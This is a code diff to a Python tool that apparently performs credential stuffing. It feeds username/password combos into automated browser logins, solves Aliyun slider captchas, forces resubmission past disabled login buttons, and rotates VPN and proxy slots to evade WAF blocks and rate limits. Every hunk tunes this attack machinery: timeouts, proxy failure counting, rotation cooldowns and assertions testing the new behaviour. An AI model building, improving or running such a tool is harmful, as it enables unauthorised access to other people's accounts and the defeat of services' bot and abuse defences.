@@ -782,9 +782,9 @@ class SmartController:
             return 'NONE', {}
 
         if not is_recycling and (
-            (tag == 'LOCK' and is_drop and (t - self.last_heal_t) >= 25.0)
+            (tag == 'LOCK' and is_drop and lock_r >= 0.55 and (t - self.last_heal_t) >= 25.0)
             or (avail_mb > 0 and avail_mb < ram_floor_mb and (t - self.last_heal_t) >= 45.0)
-            or (ctx_age >= max(400, self.target_workers * 35) and (t - self.last_heal_t) >= 45.0)
+            or (ctx_age >= max(900, self.target_workers * 75) and (t - self.last_heal_t) >= 45.0)
         ):
             if (t - self.pause_until_t) >= 8.0:
                 self.scale_up_cooldown_t = max(self.scale_up_cooldown_t, t + 25.0)
@@ -3669,7 +3669,7 @@ async def do_login_via_browser(page, ctx, user: str, passw: str, wid: int = 0, w
                     try:
                         await page.wait_for_selector(
                             '#aliyunCaptcha-sliding-slider, .btn_slide, [id*="sliding-slider"]',
-                            state='visible', timeout=4500
+                            state='visible', timeout=2200
                         )
                     except Exception:
                         pass
@@ -3681,6 +3681,7 @@ async def do_login_via_browser(page, ctx, user: str, passw: str, wid: int = 0, w
                 drag_count += 1
                 did_resubmit_ok = False
                 dbg(f"w{wid:02d} Aliyun slider ({user}), solving...")
+                req_sent.clear()
                 resp_event.clear()
                 api_result["had_waf"] = False
                 if waf_lock is not None:
@@ -3698,7 +3699,7 @@ async def do_login_via_browser(page, ctx, user: str, passw: str, wid: int = 0, w
                 if api_result["json"] or api_result["had_waf"]:
                     break
                 try:
-                    await asyncio.wait_for(resp_event.wait(), timeout=1.5)
+                    await asyncio.wait_for(resp_event.wait(), timeout=2.0)
                 except asyncio.TimeoutError:
                     pass
                 if api_result["proxy_407"] and not api_result["json"]:
@@ -3706,49 +3707,57 @@ async def do_login_via_browser(page, ctx, user: str, passw: str, wid: int = 0, w
                 if api_result["proxy_err"] and not api_result["had_waf"] and not api_result["json"]:
                     return 'ERR', {'message': 'PROXY_HTTP_ERR'}
                 if not api_result["json"] and not api_result["had_waf"]:
-                    req_sent.clear()
-                    did_resubmit = False
-                    if vue_submitted:
-                        r2 = await page.evaluate(_vue_js, [user, passw])
-                        if r2 == 'CLIENT_INVALID':
-                            return 'INVALID', {'message': 'Client_InvalidLengthOrFormat'}
-                        did_resubmit = (r2 == 'OK')
-                    else:
-                        await page.evaluate("""() => {
-                            let el = document.querySelector('.content-but');
-                            while (el) {
-                                if (el.__vue__ && el.__vue__.submit) {
-                                    el.__vue__.submitState = false;
-                                    el.__vue__.submitforbiden = false;
-                                    break;
-                                }
-                                el = el.parentElement;
-                            }
-                        }""")
-                        btn = await page.query_selector('.content-but')
-                        if btn:
-                            await btn.click()
-                            did_resubmit = True
-                        else:
-                            await page.keyboard.press('Enter')
-                            did_resubmit = True
-                    if not did_resubmit:
-                        return 'WAF', {'message': 'waf_challenge_unsolved'}
-                    did_resubmit_ok = True
-                    try:
-                        await asyncio.wait_for(req_sent.wait(), timeout=1.5)
-                    except asyncio.TimeoutError:
-                        pass
-                    if not req_sent.is_set() and not resp_event.is_set() and not api_result["json"] and not api_result["had_waf"] and not api_result["proxy_err"]:
+                    if req_sent.is_set():
+                        # Captcha callback already auto-dispatched the login POST; wait for its response without double-submitting
+                        did_resubmit_ok = True
                         try:
-                            if await page.evaluate(_client_err_js):
-                                return 'INVALID', {'message': 'Client_InvalidPasswordRule'}
-                        except Exception:
+                            await asyncio.wait_for(resp_event.wait(), timeout=10.0)
+                        except asyncio.TimeoutError:
                             pass
-                    try:
-                        await asyncio.wait_for(resp_event.wait(), timeout=10.0)
-                    except asyncio.TimeoutError:
-                        pass
+                    else:
+                        req_sent.clear()
+                        did_resubmit = False
+                        if vue_submitted:
+                            r2 = await page.evaluate(_vue_js, [user, passw])
+                            if r2 == 'CLIENT_INVALID':
+                                return 'INVALID', {'message': 'Client_InvalidLengthOrFormat'}
+                            did_resubmit = (r2 == 'OK')
+                        else:
+                            await page.evaluate("""() => {
+                                let el = document.querySelector('.content-but');
+                                while (el) {
+                                    if (el.__vue__ && el.__vue__.submit) {
+                                        el.__vue__.submitState = false;
+                                        el.__vue__.submitforbiden = false;
+                                        break;
+                                    }
+                                    el = el.parentElement;
+                                }
+                            }""")
+                            btn = await page.query_selector('.content-but')
+                            if btn:
+                                await btn.click()
+                                did_resubmit = True
+                            else:
+                                await page.keyboard.press('Enter')
+                                did_resubmit = True
+                        if not did_resubmit:
+                            return 'WAF', {'message': 'waf_challenge_unsolved'}
+                        did_resubmit_ok = True
+                        try:
+                            await asyncio.wait_for(req_sent.wait(), timeout=1.5)
+                        except asyncio.TimeoutError:
+                            pass
+                        if not req_sent.is_set() and not resp_event.is_set() and not api_result["json"] and not api_result["had_waf"] and not api_result["proxy_err"]:
+                            try:
+                                if await page.evaluate(_client_err_js):
+                                    return 'INVALID', {'message': 'Client_InvalidPasswordRule'}
+                            except Exception:
+                                pass
+                        try:
+                            await asyncio.wait_for(resp_event.wait(), timeout=10.0)
+                        except asyncio.TimeoutError:
+                            pass
                 if api_result["proxy_407"] and not api_result["json"]:
                     return 'ERR', {'message': '407_TRAFFIC_EXHAUSTED', 'proxy_407': True}
                 if api_result["proxy_err"] and not api_result["had_waf"] and not api_result["json"]:
@@ -3915,7 +3924,7 @@ def _maybe_rotate_vpnpool_slot(proxy: dict | None):
             return bool(_VPNPOOL_CFG.get('api_lease_id') == api_lid) if is_api else bool(_VPNPOOL_CFG.get('started'))
         try:
             # Drain active co-workers briefly before killing this tunnel so in-flight logins aren't cut
-            _drain_end = time.monotonic() + 8.0
+            _drain_end = time.monotonic() + (3.5 if is_api else 8.0)
             while _PROXY_LOAD.get(srv, 0) > 0 and time.monotonic() < _drain_end and _active():
                 await asyncio.sleep(0.3)
             if is_api:
@@ -3937,6 +3946,7 @@ def _maybe_rotate_vpnpool_slot(proxy: dict | None):
                             new_pk = (new_p.get('server', ''), new_p.get('username') or '')
                             if new_pk != pk:
                                 _VPNPOOL_CFG['proxy_urls'].pop(pk, None)
+                                _PROXY_FAILS[new_pk] = 0
                             _VPNPOOL_CFG['proxy_urls'][new_pk] = new_raw
                             if isinstance(proxy, dict):
                                 proxy['server'] = new_p['server']
@@ -3957,6 +3967,7 @@ def _maybe_rotate_vpnpool_slot(proxy: dict | None):
                         _VPNPOOL_CFG['proxy_urls'].pop(pk, None)
                         _LIVE_LOGS.append(f" {c(GOLD)}!{W}  {c(GOLD)}API slot #{port_lbl} mati (503) — dinonaktifkan{W}")
                     else:
+                        _PROXY_FAILS[pk] = min(_PROXY_FAILS.get(pk, 0), 1)
                         _LIVE_LOGS.append(f" {c(GOLD)}!{W}  {c(GOLD)}API slot #{port_lbl} gagal rotasi{W}")
                     dbg(f"api rotate slot #{port_lbl} failed ({code}): {err_r}")
                 return
@@ -3995,7 +4006,7 @@ def _maybe_rotate_vpnpool_slot(proxy: dict | None):
         except Exception as e:
             dbg(f"vpnpool rotate {cd_key} err: {e}")
         finally:
-            cd[cd_key] = time.monotonic() + (60.0 if ok_rot else 25.0)
+            cd[cd_key] = time.monotonic() + ((12.0 if ok_rot else 8.0) if is_api else (45.0 if ok_rot else 20.0))
             _VPNPOOL_CFG['rotating'].discard(srv)
 
     try:
@@ -5061,7 +5072,8 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                             await vpn_coord.on_waf_or_rate(seen_vpn_ep, kind or err_msg, browser_state, stats)
                         if cur_proxy_info and not res_data.get('proxy_407'):
                             pk = (cur_proxy_info.get('server', ''), cur_proxy_info.get('username', ''))
-                            _PROXY_FAILS[pk] = _PROXY_FAILS.get(pk, 0) + 1
+                            _bump = 1 if err_msg == 'timeout_waiting_response' else 2
+                            _PROXY_FAILS[pk] = _PROXY_FAILS.get(pk, 0) + _bump
                             _rot_thr = 4 if err_msg == 'timeout_waiting_response' else 3
                             if _PROXY_FAILS[pk] >= _rot_thr:
                                 _maybe_rotate_vpnpool_slot(cur_proxy_info)
@@ -5071,7 +5083,7 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                         _is_net_err = any(k in err_low for k in ('timeout', 'timed_out', 'not_loaded', 'err_', 'reset', 'refused', 'aborted', 'socks', 'connection'))
                         if cur_proxy_info and _is_net_err:
                             pk = (cur_proxy_info.get('server', ''), cur_proxy_info.get('username', ''))
-                            _PROXY_FAILS[pk] = _PROXY_FAILS.get(pk, 0) + 1
+                            _PROXY_FAILS[pk] = _PROXY_FAILS.get(pk, 0) + (1 if 'not_loaded' in err_low else 2)
                             if _PROXY_FAILS[pk] >= 3:
                                 _maybe_rotate_vpnpool_slot(cur_proxy_info)
                         if vpn_coord and _is_net_err:
@@ -5588,6 +5600,12 @@ async def async_main():
         assert act_w == 'ROTATE_VPN' and sc_w.target_workers == 12, (act_w, sc_w.target_workers)
         act_ram, _ = sc_w.decide_action(avail_mb=200.0, can_rotate_vpn=False, ctx_age=10, is_recycling=False, now_t=70.0)
         assert act_ram == 'RECYCLE_BROWSER' and sc_w.target_workers == 12, (act_ram, sc_w.target_workers)
+        sc_w.last_heal_t = 0.0
+        sc_w.stalls.clear()
+        sc_w.record_stall('waf', 4.0, now_t=75.0)
+        sc_w.record_stall('lock', 3.0, now_t=75.0)
+        act_nolock, _ = sc_w.decide_action(avail_mb=3000.0, can_rotate_vpn=False, ctx_age=500, is_recycling=False, now_t=76.0)
+        assert act_nolock == 'NONE', act_nolock
         assert _vpnpool_slot_from_proxy({'server': 'socks5://10.200.4.2:1080'}) == 4
         assert _vpnpool_slot_from_proxy({'server': 'http://1.2.3.4:8080'}) == 0
         assert _calc_multi_vpn_slots(10) == 15 and _calc_multi_vpn_slots(4) == 6 and _calc_multi_vpn_slots(1) == 2
@@ -5716,6 +5734,9 @@ async def async_main():
             assert _parsed_api_p.get('username') == 'u9' and _parsed_api_p.get('password') == 'p9'
             assert (_parsed_api_p['server'], 'u9') in _VPNPOOL_CFG['proxy_urls']
             assert any(f"API slot #{_gw_srv.server_port} rotated" in ln for ln in _LIVE_LOGS)
+            _api_cd_rem = _VPNPOOL_CFG['cooldown'].get(_parsed_api_p['server'], 0.0) - time.monotonic()
+            assert 0.0 < _api_cd_rem <= 15.0, f"API rotate cooldown too long: {_api_cd_rem}"
+            _VPNPOOL_CFG['cooldown'].clear()
             # Probe HTTP status parity (405 WAF block must fail just like server.py)
             assert _probe_ok_http_code(200) is True and _probe_ok_http_code(405) is False and _probe_ok_http_code(429) is False
             # 503 on /rotate retires closed slot permanently from _VPNPOOL_CFG['proxy_urls'] into dead_proxies
